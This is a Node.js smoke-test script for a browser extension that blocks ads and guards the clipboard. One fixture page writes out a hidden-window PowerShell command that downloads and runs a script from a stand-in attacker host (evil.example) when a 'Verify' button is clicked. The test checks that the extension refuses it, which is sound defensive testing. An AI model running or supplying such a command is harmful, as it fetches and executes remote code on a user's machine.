// Smoke test of the unpacked extension in a real Chrome, offline.
//
//   CHROME_PATH=/path/to/chrome-for-testing/chrome node scripts/chrome-smoke.mjs [--shots DIR]
//
// Loads the repository root as an unpacked extension (Chrome for Testing:
// Google Chrome 137 and later ignores --load-extension), sends every host
// name to a small local server (--host-resolver-rules), and checks what the
// unit tests can only model:
//   1. the service worker starts and installs the packed hide rules;
//   2. the network rules block four ad and tracker scripts and keep two
//      ordinary scripts;
//   3. the hide sheet hides two ad boxes and keeps the article box;
//   4. the clipboard guard refuses a PowerShell command written on a click,
//      and lets plain text through;
//   5. the toolbar popup opens on the page, names its host and offers
//      Fix this site and Allow this site.
// No request leaves the machine: the list refresh fails (no network), and the
// packed lists stay in use. Each check prints PASS or FAIL; the exit code is
// 1 when one fails. Node 22 or later (global WebSocket). Not run in CI.
import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { openChrome } from "./lib/chrome-shot.mjs";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const shotsAt = process.argv.indexOf("--shots");
const SHOTS = shotsAt > 0 ? path.resolve(process.argv[shotsAt + 1] || "") : "";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const ADS_PAGE = `<!doctype html><html><head><title>smoke</title></head><body>
<p id="article">Article text.</p>
<div class="ad-slot" id="box1" style="width:300px;height:90px;background:red">ad</div>
<div id="taboola-below-article-thumbnails" style="width:300px;height:90px;background:red">ad</div>
<div class="article-body" id="keep" style="width:300px;height:40px;background:green">keep</div>
<script>
window.__net = {};
const urls = {
  adsense: "http://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js",
  gpt: "http://securepubads.g.doubleclick.net/tag/js/gpt.js",
  taboola: "http://cdn.taboola.com/libtrc/x/loader.js",
  gtm: "http://www.googletagmanager.com/gtm.js?id=GTM-X",
  jquery: "http://code.jquery.com/jquery-3.7.1.min.js",
  same: "/app.js",
};
for (const [k, u] of Object.entries(urls)) {
  const s = document.createElement("script");
  s.src = u;
  s.onload = () => { __net[k] = "loaded"; };
  s.onerror = () => { __net[k] = "blocked"; };
  document.head.appendChild(s);
}
</script></body></html>`;

const CLIP_PAGE = `<!doctype html><html><body>
<button id="bad" style="width:200px;height:40px">Verify</button>
<button id="ok" style="width:200px;height:40px">Copy</button>
<script>
window.__clip = [];
const run = (id, text) => document.getElementById(id).addEventListener("click", () =>
  navigator.clipboard.writeText(text).then(() => __clip.push(id + " written"), (e) => __clip.push(id + " refused " + e.name)));
run("bad", 'powershell -w hidden -c "iwr http://evil.example/x.ps1 | iex"');
run("ok", "hello world");
</script></body></html>`;

const results = [];
function check(name, ok, detail) {
  results.push(ok);
  console.log((ok ? "PASS  " : "FAIL  ") + name + (detail ? "  (" + detail + ")" : ""));
}

async function main() {
  const server = http.createServer((req, res) => {
    const p = new URL(req.url, "http://x").pathname;
    const page = p === "/ads.html" ? ADS_PAGE : p === "/clip.html" ? CLIP_PAGE : null;
    res.writeHead(200, { "content-type": page ? "text/html" : p.endsWith(".js") ? "text/javascript" : "text/plain" });
    res.end(page || (p.endsWith(".js") ? "/* ok */" : "ok"));
  });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const port = server.address().port;
  const ADS = "http://news.smoke.test/ads.html";
  const CLIP = "http://verify.smoke.test/clip.html";
  const chrome = await openChrome(process.env.CHROME_PATH, [
    `--disable-extensions-except=${ROOT}`,
    `--load-extension=${ROOT}`,
    `--host-resolver-rules=MAP * 127.0.0.1:${port}, EXCLUDE localhost`,
    // navigator.clipboard needs a secure context; the fixture pages are http.
    "--unsafely-treat-insecure-origin-as-secure=http://news.smoke.test,http://verify.smoke.test",
  ]);
  const { send } = chrome;
  try {
    // 1. Service worker.
    let worker = null;
    for (let i = 0; i < 100 && !worker; i++) {
      const { targetInfos } = await send("Target.getTargets");
      worker = targetInfos.find((t) => t.type === "service_worker" && t.url.endsWith("/src/general-background.js"));
      if (!worker) await sleep(150);
    }
    check("service worker started", !!worker, worker ? new URL(worker.url).host : "no worker: Google Chrome 137+ ignores --load-extension, use Chrome for Testing");
    if (!worker) return;
    const sw = (await send("Target.attachToTarget", { targetId: worker.targetId, flatten: true })).sessionId;
    const evalIn = async (sessionId, expression) => {
      const r = await send("Runtime.evaluate", { expression, awaitPromise: true, returnByValue: true }, sessionId);
      if (r.exceptionDetails) throw new Error(r.exceptionDetails.exception ? r.exceptionDetails.exception.description : r.exceptionDetails.text);
      return r.result.value;
    };
    let meta = null;
    for (let i = 0; i < 60 && !meta; i++) {
      // The worker's extension APIs can be missing for a moment after start.
      meta = await evalIn(sw, "typeof chrome === 'object' && chrome.storage ? chrome.storage.local.get('cosMeta').then((s) => s.cosMeta || null) : null");
      if (!meta) await sleep(250);
    }
    check("packed hide rules installed", !!meta, meta ? meta.count + " keys, source " + meta.source : "no cosMeta");

    const open = async (url) => {
      const page = await chrome.newPage({ width: 800, height: 600 });
      await send("Runtime.enable", {}, page.sessionId);
      await send("Emulation.setFocusEmulationEnabled", { enabled: true }, page.sessionId);
      const loaded = chrome.waitEvent("Page.loadEventFired", page.sessionId, 15000);
      await send("Page.navigate", { url }, page.sessionId);
      await loaded;
      await sleep(1500);
      return page;
    };
    const shot = async (page, name) => {
      if (!SHOTS) return;
      fs.mkdirSync(SHOTS, { recursive: true });
      const { data } = await send("Page.captureScreenshot", { format: "png" }, page.sessionId);
      fs.writeFileSync(path.join(SHOTS, name + ".png"), Buffer.from(data, "base64"));
    };

    // 2 and 3. Network rules and hide sheet.
    const ads = await open(ADS);
    const net = await evalIn(ads.sessionId, "window.__net");
    const want = { adsense: "blocked", gpt: "blocked", taboola: "blocked", gtm: "blocked", jquery: "loaded", same: "loaded" };
    const wrong = Object.keys(want).filter((k) => net[k] !== want[k]);
    check("network rules: 4 ad and tracker scripts blocked, 2 ordinary scripts loaded", wrong.length === 0, wrong.length ? wrong.map((k) => k + "=" + net[k]).join(", ") : "");
    const shown = await evalIn(ads.sessionId, "['box1', 'taboola-below-article-thumbnails', 'keep'].map((id) => getComputedStyle(document.getElementById(id)).display)");
    check("hide sheet: 2 ad boxes hidden, the article box shown", shown[0] === "none" && shown[1] === "none" && shown[2] !== "none", shown.join(", "));
    await shot(ads, "ads");

    // 5. Popup on the ads page (the active tab).
    await send("Target.activateTarget", { targetId: ads.targetId });
    await evalIn(sw, "chrome.action.openPopup().then(() => true)");
    let popup = null;
    for (let i = 0; i < 40 && !popup; i++) {
      const { targetInfos } = await send("Target.getTargets");
      popup = targetInfos.find((t) => t.url.endsWith("/src/popup.html"));
      if (!popup) await sleep(150);
    }
    if (popup) {
      const ps = (await send("Target.attachToTarget", { targetId: popup.targetId, flatten: true })).sessionId;
      await send("Page.enable", {}, ps);
      await sleep(1200);
      const state = await evalIn(ps, "({ host: document.getElementById('site-host').textContent, fix: !document.getElementById('fix-site').disabled, allow: !document.getElementById('allow-site').disabled })");
      check("popup: names the page host, Fix this site and Allow this site enabled", state.host === "news.smoke.test" && state.fix && state.allow, JSON.stringify(state));
      await shot({ sessionId: ps }, "popup");
    } else {
      check("popup: names the page host, Fix this site and Allow this site enabled", false, "the popup did not open");
    }

    // 4. Clipboard guard, with real mouse clicks (a user gesture).
    await send("Browser.grantPermissions", { origin: "http://verify.smoke.test", permissions: ["clipboardReadWrite", "clipboardSanitizedWrite"] });
    const clip = await open(CLIP);
    const click = async (id) => {
      const r = await evalIn(clip.sessionId, `(() => { const b = document.getElementById(${JSON.stringify(id)}).getBoundingClientRect(); return { x: b.x + b.width / 2, y: b.y + b.height / 2 }; })()`);
      for (const type of ["mousePressed", "mouseReleased"]) {
        await send("Input.dispatchMouseEvent", { type, x: r.x, y: r.y, button: "left", clickCount: 1 }, clip.sessionId);
      }
      await sleep(600);
    };
    await click("bad");
    await click("ok");
    const log = await evalIn(clip.sessionId, "window.__clip");
    check("clipboard guard: a PowerShell command refused, plain text written", log.includes("bad refused NotAllowedError") && log.includes("ok written"), log.join("; "));
    await shot(clip, "clipboard");
  } finally {
    await chrome.close();
    server.close();
  }
}

main().then(() => {
  const failed = results.filter((ok) => !ok).length;
  console.log(failed ? `RESULT: ${failed} of ${results.length} checks failed` : `RESULT: all ${results.length} checks passed`);
  process.exit(failed ? 1 : 0);
}, (e) => {
  console.error("ERROR: " + (e && e.message || e));
  process.exit(1);
});
